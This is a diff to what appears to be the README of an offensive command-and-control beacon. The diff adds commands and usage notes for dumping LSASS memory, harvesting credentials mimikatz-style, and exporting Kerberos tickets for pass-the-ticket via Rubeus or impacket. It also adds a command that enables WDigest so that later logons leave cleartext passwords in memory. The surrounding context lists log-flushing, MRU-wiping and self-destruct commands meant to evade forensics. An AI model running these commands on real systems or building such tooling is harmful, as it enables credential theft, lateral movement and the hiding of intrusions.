@@ -77,6 +77,11 @@ The beacon exposes these taskable commands (also usable from the interactive
 | `flushlogs` | best-effort flush of OS logs (Linux journal/messages/auth; Windows Event logs). |
 | `cleanmru <path>` | remove a path from OS recently-used / MRU lists. |
 | `selfdestruct <path>` | wipe this beacon file + temp copies, then exit. |
+| `lsass <out.dmp> [comsvcs\|ctypes]` | dump LSASS process memory to a minidump (Windows, admin). See "LSASS process memory dump". |
+| `lsass-parse <dump_path>` | parse an LSASS minidump with pypykatz (operator side). |
+| `sekurlsa [--pkgs ...] [--pid ...] [--no-lsa] [--export-dir D] [--export-ccache F]` | live-parse LSASS SSPs in-memory (mimikatz `sekurlsa::logonpasswords`; Windows, admin). Optional Kerberos ticket export. See "sekurlsa::logonpasswords". |
+| `wdigest-enable [--disable]` | set WDigest `UseLogonCredential=1` (or 0) so future logons leave cleartext in LSASS (Windows, admin). |
+| `wdigest-status` | show the current WDigest `UseLogonCredential` setting (Windows). |
 
 ## Reverse shell (bash callback → interactive shell)
 
@@ -220,7 +225,32 @@ beacon[<sid>]> sekurlsa --pkgs msv,wdigest,kerberos        # subset only
 beacon[<sid>]> sekurlsa --pid 1234                          # explicit PID
 beacon[<sid>]> sekurlsa --no-lsa                            # skip LSA step
                                                           # (faster, no cleartext)
+beacon[<sid>]> sekurlsa --export-dir C:\Windows\Temp\tk     # dump tickets as .kirbi
+beacon[<sid>]> sekurlsa --export-ccache C:\Windows\Temp\t.cc  # one MIT ccache
 ```
+
+**Kerberos ticket export (pass-the-ticket):** `--export-dir` writes each
+recovered TGT/TGS as a `.kirbi` file; `--export-ccache` writes them all into
+one MIT ccache. Both force the `kerberos` SSP on and need the LSA session
+key, so they're ignored in `--no-lsa` mode. Upstream pypykatz hard-disables
+ticket parsing in `get_kerberos()` (flagged "not working"); this module
+drives `KerberosDecryptor` directly with `with_tickets=True` to recover the
+kirbi blobs. Feed the `.kirbi` to Rubeus / mimikatz `kerberos::ptt`, or use
+the ccache with impacket's `secretsdump`/`psexec` etc.
+
+**WDigest cleartext toggle** — before sekurlsa can recover cleartext
+passwords from WDigest, the target must have `UseLogonCredential=1`:
+
+```bash
+beacon[<sid>]> wdigest-status         # is cleartext storage on?
+beacon[<sid>]> wdigest-enable         # set UseLogonCredential=1
+beacon[<sid>]> wdigest-enable --disable   # set it back to 0
+```
+
+The flag only takes effect for **new** logons — after enabling, wait for a
+user/service to re-authenticate, then run `sekurlsa` to harvest the
+cleartext. Setting it requires admin (HKLM write). Operator-side equivalents:
+`cscli wdigest-enable [--disable]` and `cscli wdigest-status`.
 
 The output looks like:
 
